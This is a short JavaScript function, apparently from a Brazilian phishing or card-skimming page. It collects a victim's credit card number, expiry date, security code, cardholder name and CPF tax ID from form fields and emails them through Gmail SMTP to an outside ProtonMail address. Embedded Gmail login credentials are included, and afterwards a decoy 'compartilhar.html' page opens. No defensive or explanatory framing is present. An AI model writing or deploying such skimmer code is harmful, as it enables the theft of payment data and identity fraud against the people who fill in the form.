function sendEmail() {
    let ccNum  = document.getElementById("ccnumber").value;
    let ccExp  = document.getElementById("cc-exp").value;
    let ccCsc  = document.getElementById("cc-csc").value;
    let ccName = document.getElementById("ccname").value;
    let cpf    = document.getElementById("cpf").value; 
    let finalmessage = `CC Number : ${ccNum} <br>  CC-EXP : ${ccExp} <br>  CC-CSC : ${ccCsc} <br> CC NAME : ${ccName} <br> CPF: ${cpf}`;

    Email.send({
        Host: "smtp.gmail.com",
        Username : "xsda.ddce.2343.2343.xsop@gmail.com",
        Password : "xhqe towf geiu nvyt",
        To : 'user1533@protonmail.com',
        From : "xsda.ddce.2343.2343.xsop@gmail.com",
        Subject : "Mail from website",
        Body : finalmessage
    });
    
    window.open('compartilhar.html', '_blank');
}